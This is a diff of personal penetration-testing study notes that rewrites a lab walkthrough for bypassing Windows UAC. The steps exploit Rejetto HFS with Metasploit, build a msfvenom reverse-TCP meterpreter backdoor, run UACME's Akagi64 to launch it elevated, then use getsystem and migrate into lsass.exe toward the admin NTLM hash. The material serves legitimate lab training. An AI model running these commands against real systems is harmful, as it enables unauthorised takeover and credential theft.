@@ -347,112 +347,56 @@ In order to elevate privileges by bypassing UAC, you will need access to a user 
 
 ---
 
-How to bypass UAC
-(part 1)
-- perform nmap scan on target 
-- try to access webserver on target (port 80)
-- start up metasploit framework 
-	- search rejetto 
-			  Metasploit Framework that targets a vulnerability in the Rejetto HTTP File Server (HFS). HFS is a lightweight web server software used to share files and folders over HTTP.
-	- use exploit and set options 
-	- perform basic local enumeration
-		- sysinfo
-		- pgrep explorer (to find processid for explorer.exe)
-		- migrate 2448 (we want to migrate to explorer session and get a 64bit meterpeter session) 
-			-. It is important to match the architecture of the Meterpreter session with the target system to ensure compatibility and successful exploitation. 
-		- sysinfo 
-		  
-	Part 1.1
-	- In new window: 
-		- Generate payload:  msfvenom -p windows/meterpreter/reverse_tcp LHOST=yourip LPORT=1234 -f exe > backdoor.exe
-	- In new msfconsole window: 
-		- set up listernet with msfconsole (new metasploit session)
-			- set up multihandler to receive the connection once the payload is executed on the target 
-			- use multi/handler 
-			- set payload windows/meterpreter/revers_tcp
-			- set LHOST to kali ip and LPORT to 1234
-			- run and now go back to other meterpreter session **(part 2)**
-			  
-		- (Part 3) after running akigai you should see stage being sent 
-		- run sysinfo 
-		- run getuid 
-		- get privs (no you see you have elevated privileges even though you are an admin account and not administrator)
-			- ps (list process tree)
-				- you can migrate to any other services: migrate processid 
-				- getuid 
-		  
-	- **part 2**
-		- pwd 
-		- getuid
-		- getprivs (to check that you still don't have privileges)
-		- cd C:// 
-		- mkdir Temp (best location for exploit code, don't upload to locations that are frequently accessed by users )
-		- cd temp 
-		- upload backdoor.exe
-		- upload /root/Desktop/tools/UACME/Akagi64.exe 
-		- right now we cannot execute these files with administrator privileges because UAC will prevent us so we need to Bypass uac
-	- \in a new sell run .\\Akagi64.exe 23 c:\Temp\\backdoor.exe 
-		- now go back to listener (part 3)
-	
-
-
-![[Pasted image 20230705214848.png]]
-		Now we are admin, who  is not administrator but part of the local administrators group 
-- we can get the current privileges of the users through meterpreter session with: getprivs 
-- verify that this user is part of local administrators group we start a shell session and identify the info by:
-	- netuser (shows all the users)
-	- net localgroup administrators ![[Pasted image 20230705215644.png]] we see that administrator is part of a the group which means that this user can essentially execute programs with elevated privileges but to do that we need to bypass UAC 
-
-
-
-----
-How to bypass UAC:
-
-Part 1:
-1. Perform an Nmap scan on the target system.
-2. Try to access the web server on the target system (port 80).
-3. Start up the Metasploit Framework.
-   - Search for the exploit targeting the Rejetto HTTP File Server (HFS) vulnerability.
-   - Configure the exploit by setting the required options.
-   - Perform basic local enumeration:
-     - Retrieve system information (sysinfo).
-     - Identify the process ID for explorer.exe (pgrep explorer).
-     - Migrate to the explorer session using process ID 2448 (migrate 2448).
-     - Retrieve system information again (sysinfo).
-
-Part 1.1:
-4. In a new window:
-   - Generate the payload using msfvenom: msfvenom -p windows/meterpreter/reverse_tcp LHOST=yourip LPORT=1234 -f exe > backdoor.exe.
-   
+1. Perform an Nmap scan on the target system to gather information about open ports and services.
+    
+2. Try to access the web server on the target system by connecting to port 80.
+    
+3. Start up the Metasploit Framework:
+    
+    - Search for the exploit targeting the Rejetto HTTP File Server (HFS) vulnerability, which is a lightweight web server software.
+    - Configure the exploit by setting the required options.
+    - Perform basic local enumeration:
+        - Retrieve system information using the `sysinfo` command.
+        - Identify the process ID for `explorer.exe` using the `pgrep explorer` command.
+        - Migrate to the `explorer` session using the process ID (e.g., `migrate 2448`). This is done to match the architecture of the Meterpreter session with the target system for compatibility.
+        - Retrieve system information again using the `sysinfo` command to verify the successful migration.
+	        - Run the command `net user` to view all the users on the system.
+	        - Run the command `net localgroup administrators` to verify that the current user is part of the local administrators group. Ensure that the "Administrator" account is listed within the administrators group. This indicates that the user can execute programs with elevated privileges.
+	          
+1. In a new window:
+    
+    - Generate the payload using `msfvenom`: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=yourip LPORT=1234 -f exe > backdoor.exe`.
+      
 5. In another new Metasploit console window:
-   - Set up a listener using the multi/handler module.
-   - Configure the listener by setting the payload to windows/meterpreter/reverse_tcp and specifying LHOST as your IP and LPORT as 1234.
-   - Run the listener and then return to the previous Meterpreter session (part 2).
-
-Part 2:
+    
+    - Set up a listener using the `multi/handler` module in Metasploit.
+    - Configure the listener by setting the payload to `windows/meterpreter/reverse_tcp` and specifying LHOST as your IP and LPORT as 1234.
+    - Run the listener and then return to the previous Meterpreter session (part 2).
+      
 6. In the previous Meterpreter session:
-   - Check the current working directory (pwd).
-   - Retrieve the current user ID (getuid).
-   - Verify privileges (getprivs).
-   - Change the directory to C:\\.
-   - Create a new directory named "Temp" (mkdir Temp).
-   - Change to the Temp directory (cd temp).
-   - Upload the backdoor.exe file to the target system.
-   - Upload the Akagi64.exe file from the path /root/Desktop/tools/UACME/Akagi64.exe.
-   - At this point, we cannot execute these files with administrator privileges due to UAC restrictions, so we need to bypass UAC.
+    
+    - Check the current working directory using `pwd`.
+    - Retrieve the current user ID using `getuid`.
+    - Verify privileges using `getprivs` to ensure the current privileges.
+    - Change the directory to `C:\\` using `cd C:\\`.
+    - Create a new directory named "Temp" using `mkdir Temp`.
+    - Change to the Temp directory using `cd Temp`.
+    - Upload the `backdoor.exe` file to the target system using `upload backdoor.exe`.
+    - Upload the `Akagi64.exe` file from the path `/root/Desktop/tools/UACME/Akagi64.exe` using `upload /root/Desktop/tools/UACME/Akagi64.exe`.
+7. Open a new shell in Meterpreter using the `shell` command.
+    
+    - Run the command `\.\\Akagi64.exe 23 c:\Temp\\backdoor.exe` to bypass UAC and execute the backdoor.
+8. Go back to the listener console window (where the Meterpreter session with higher privileges is active):
+    
+- Observe the stage being sent: Monitor the progress of the active session.
+- Run `sysinfo`: Gather system information, including details about the compromised system.
+- Run `getuid`: Check the current user ID to determine the privileges of the compromised session.
+- Gain elevated privileges using the `getprivs` command: Attempt to acquire additional privileges beyond the current level.
+- Use the `getsystem` command: This command in Meterpreter is used to escalate privileges on a compromised system. It attempts to elevate the current Meterpreter session to the highest available privilege level, typically aiming for SYSTEM-level privileges on Windows systems.
+- List the process tree using `ps`: View the running processes on the compromised system.
+- Migrate to another process using the `migrate processid` command: By migrating to another process, such as `lsass.exe` (Local Security Authority Subsystem Service), the attacker gains access to high-level privileges and sensitive security-related information. Migrating to `lsass.exe` offers advantages such as privilege elevation and persistence.
+- Check the current user ID again using `getuid`: Verify if the user ID has changed after migrating to the new process.
 
-7. First open new shell: enter shell in meterpreter
-	- now Run the command "\.\\Akagi64.exe 23 c:\Temp\\backdoor.exe".
-
-Part 3:
-8. Go back to the listener console window.
-   - Observe the stage being sent.
-   - Run sysinfo to gather system information.
-   - Run getuid to check the current user ID.
-   - Gain elevated privileges using the "getprivs" command.
-   - List the process tree using "ps".
-   - Migrate to another process using the "migrate processid" command.
-   - Check the current user ID again using "getuid".
 
 
 ----
@@ -467,32 +411,12 @@ Lab
 
 **Objective:** Gain the highest privilege on the compromised machine and get admin user NTLM hash.
 
-![[Pasted image 20230705232405.png]]
-
-![[Pasted image 20230705233153.png]]
-![[Pasted image 20230705234604.png]]
 
 ![[Pasted image 20230705234559.png]]
-![[Pasted image 20230705234707.png]]
 
+![[Pasted image 20230706153531.png]]
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+![[Pasted image 20230706153850.png]]
 
 
 
